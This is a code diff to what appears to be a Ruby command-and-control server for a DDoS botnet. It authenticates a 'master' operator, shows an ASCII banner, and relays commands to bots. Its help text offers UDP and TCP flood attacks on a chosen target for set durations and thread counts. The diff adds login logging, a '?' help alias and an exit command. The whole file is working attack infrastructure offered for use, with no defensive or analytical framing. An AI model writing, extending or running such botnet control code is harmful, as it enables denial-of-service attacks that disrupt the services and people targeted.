@@ -21,7 +21,7 @@ server = TCPServer.new "0.0.0.0", ARGV[0].to_i  # Change this if you want
 cmd = ''
 loop do
   Thread.start(server.accept) do |master|
-    print "[*] Master connection from #{master.peeraddr[3]}\n"
+    print "[*] Master login connection from #{master.peeraddr[3]}\n"
     master.print "Username: "
     inputted_uname = master.gets
     master.print "Password: "
@@ -30,7 +30,9 @@ loop do
     if inputted_uname.strip! != uname || inputted_pass.strip! != password
       master.puts "Don't try it"
       master.close
+      puts "[*] Master login failed (used #{uname}:#{password})"
     end
+    puts "[*] Master login successful!"
     master.print "
 ███████╗     ██████╗     ██████╗      █████╗
 ██╔════╝    ██╔═══██╗    ██╔══██╗    ██╔══██╗
@@ -53,7 +55,7 @@ Made with <3 by AM-77\n\n"
         puts "Master command recieved: #{cmd}"  # prints to main server
         split = cmd.split(' ')
 
-        if cmd == "help"
+        if cmd == "help" || cmd == '?'
           master.puts
           master.puts "udp <target> <time (ms)> <threads>        Perform a UDP flood on <target> for <time> milliseconds using <threads> threads per system"
           master.puts "tcp <target> <port> <time (ms)> <threads> Perform a TCP flood on <target>:<port> for <time> ms using <threads> threads"
@@ -75,6 +77,10 @@ Made with <3 by AM-77\n\n"
           writeCmd("NONE")
         elsif cmd == ""
           next
+        elsif cmd == "exit"
+          master.puts "Bye bye!"
+          master.close
+          cmd = ""
         else
           master.puts "\033[31m Unknown command: #{cmd}\033[0m"
         end
@@ -89,9 +95,7 @@ Made with <3 by AM-77\n\n"
         puts "Botmaster: Something's listening on port #{ARGV[1]}"
       end
   end
-  master.puts "Bye bye!"
-  master.close
-  cmd = ""
+
   next
 
 end end
